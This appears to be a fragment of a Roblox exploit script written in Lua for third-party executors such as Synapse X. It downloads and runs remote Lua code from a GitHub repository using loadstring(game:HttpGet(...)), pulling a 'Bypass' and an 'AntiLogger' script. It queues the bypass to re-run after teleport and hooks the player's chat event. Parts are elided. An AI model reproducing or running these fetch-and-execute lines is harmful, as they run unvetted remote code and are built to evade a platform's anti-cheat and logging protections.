...
if queueonteleport then
    queueonteleport(
        "loadstring(game:HttpGet('https://raw.githubusercontent.com/Hatomi-Ciqada/Pen-Testing-and-Vulnerabilities/main/LUA%20SCRIPTS/Bypass.lua'))()"
    )
end
...
if syn and "Synapse X" then
    loadstring(
        game:HttpGet(
            "https://raw.githubusercontent.com/Hatomi-Ciqada/Pen-Testing-and-Vulnerabilities/main/LUA%20SCRIPTS/AntiLogger.lua",
            true
        )
    )()
    ...
    local PostMessage =
        require(Player:WaitForChild("PlayerScripts"):WaitForChild("ChatScript"):WaitForChild("ChatMain")).MessagePosted
